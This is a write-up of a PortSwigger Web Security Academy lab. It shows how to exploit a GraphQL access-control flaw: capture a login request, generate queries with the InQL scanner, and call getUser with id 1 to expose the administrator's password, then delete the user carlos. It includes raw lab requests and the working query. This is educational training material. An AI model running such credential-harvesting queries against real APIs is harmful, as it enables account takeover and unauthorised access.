# [Accidental exposure of private GraphQL fields](https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure)

```
The user management functions for this lab are powered by a GraphQL endpoint.

The lab contains an access control vulnerability whereby you can induce the API
to reveal user credential fields.

To solve the lab, sign in as the administrator and delete the username carlos


```

- ### There is an access control vulnerability.
- ### Induce the API to reveal user credential fields

<br>

1. Login as peter
2. Send the login Post request to Repeater
`POST /graphql/v1 HTTP/2`

#### The request:
```HTTP
POST /graphql/v1 HTTP/2
Host: 0ad600ae033e31fd80d82b1400e00015.web-security-academy.net
Cookie: session=ZH9c2h82oKmfd0FIs41gc7f1H5Eofiei; session=IBQkjhPYR7JeDQEP7mOneAGXTZ7TICnX
Content-Length: 232
Accept: application/json
Content-Type: application/json
Origin: https://0ad600ae033e31fd80d82b1400e00015.web-security-academy.net
Referer: https://0ad600ae033e31fd80d82b1400e00015.web-security-academy.net/login

{"query":"\n    mutation login($input: LoginInput!) {\n        login(input:
$input) {\n            token\n            success\n        }\n
}","operationName":"login","variables":{"input":{"username":"wiener","password":"peter"}}}
```
<br>

**NEXT**
> Right-click -> extensions -> InQL GraphQL Scanner -> Generate Queries with InQL scanner
> Click on the InQL tab, and open the folder for the scan you just did
> Then select: queries -> getUser.graphql

<br>

#### This reveals in the window on the rignt the query:
```'GraphQL
query {
    getUser(id: Int!) {
        id
        password
        username
    }
}
```
<br>

- **Because the goal is to Induce the API to reveal user credential fields**
- **Then that means that the query above means you gotta substitute the Int! for an actual number**

- But first, right-click on that getUser.graphql query and send to Repeater
- Then, change Int! to 1
- Guessing 1 is the administarator's id number
```'GraphQL
query {
    getUser(id: 1) {
        id
        password
        username
    }
}
```

![GraphQL-lab-02](https://github.com/LinuxUser255/Web-Security-Academy-Series/assets/46334926/3cb75a77-9820-4dfa-a69f-f95c958973bf)



### Now log in as the administrator, go to admin panel and delete carlos


